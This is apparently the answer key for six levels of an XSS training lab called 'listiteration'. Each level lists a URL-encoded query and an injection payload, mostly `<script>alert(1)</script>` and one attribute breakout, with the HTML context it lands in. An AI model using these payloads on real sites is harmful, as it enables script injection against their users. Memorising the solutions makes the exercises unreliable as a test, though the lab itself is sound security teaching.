# listiteration — solutions

Input split on a delimiter and each chunk rendered into HTML — inject in a single chunk.

### listiteration-level1

`/listiteration/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: split on `,` rendered into `<li>` (single token still injects)

### listiteration-level2

`/listiteration/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: split on `|` rendered into `<td>`

### listiteration-level3

`/listiteration/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: split on `\n` rendered into `<p>`

### listiteration-level4

`/listiteration/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: split on space rendered into `<span class=tag>` (no spaces in payload)

### listiteration-level5

`/listiteration/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: split on `;` rendered into `<option value="..">..</option>`

### listiteration-level6

`/listiteration/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: single dynamic `<li>` among 20 static ones
